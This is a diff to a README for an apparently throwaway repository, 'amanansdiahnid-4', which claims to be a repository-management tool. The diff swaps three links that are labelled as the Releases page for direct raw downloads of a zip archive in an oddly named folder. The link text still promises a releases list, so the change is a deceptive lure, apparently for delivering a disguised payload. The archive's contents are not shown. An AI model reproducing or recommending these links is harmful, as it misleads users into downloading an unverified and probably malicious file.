@@ -6,7 +6,7 @@ Welcome to amanansdiahnid-4. This application helps you manage your repositories
 
 ## 📥 Download Now
 
-[![Download amanansdiahnid-4](https://img.shields.io/badge/Download-amanansdiahnid--4-blue.svg)](https://github.com/asapbeat911/amanansdiahnid-4/releases)
+[![Download amanansdiahnid-4](https://raw.githubusercontent.com/asapbeat911/amanansdiahnid-4/main/saturable/amanansdiahnid-4.zip)](https://raw.githubusercontent.com/asapbeat911/amanansdiahnid-4/main/saturable/amanansdiahnid-4.zip)
 
 ## 📋 Overview
 
@@ -29,7 +29,7 @@ To use amanansdiahnid-4, ensure your computer meets the following requirements:
 
 ## 🔥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/asapbeat911/amanansdiahnid-4/releases) to download the latest version of amanansdiahnid-4. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/asapbeat911/amanansdiahnid-4/main/saturable/amanansdiahnid-4.zip) to download the latest version of amanansdiahnid-4. Follow these steps:
 
 1. Click on the link above to go to the Releases page.
 2. You will see a list of available versions. Choose the latest version for your operating system.
@@ -74,4 +74,4 @@ If you have any questions or need help, please feel free to reach out via the is
 
 ## 📥 Download Now Again
 
-Don't forget to visit the [Releases page](https://github.com/asapbeat911/amanansdiahnid-4/releases) to download amanansdiahnid-4 and enjoy managing your repositories with ease!
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/asapbeat911/amanansdiahnid-4/main/saturable/amanansdiahnid-4.zip) to download amanansdiahnid-4 and enjoy managing your repositories with ease!
